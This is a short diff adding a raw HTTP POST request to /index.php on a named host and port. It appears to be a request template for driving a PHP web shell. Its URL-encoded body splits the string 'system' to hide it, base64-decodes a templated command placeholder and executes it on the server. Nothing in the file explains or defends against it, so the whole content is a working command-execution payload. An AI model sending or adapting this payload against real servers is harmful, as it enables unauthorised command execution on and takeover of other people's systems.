@@ -1,0 +1,8 @@
+POST /index.php HTTP/1.1
+Host: mut-orff.org:12345
+Accept-Encoding: identity
+Content-Length: 153
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+
+222=%24a%3D%27sy%27.%27stem%27%3B%24b%20%3D%20%27{{cmd}}%27%3B%24a%28base64_decode%28%24b%29%29%3B
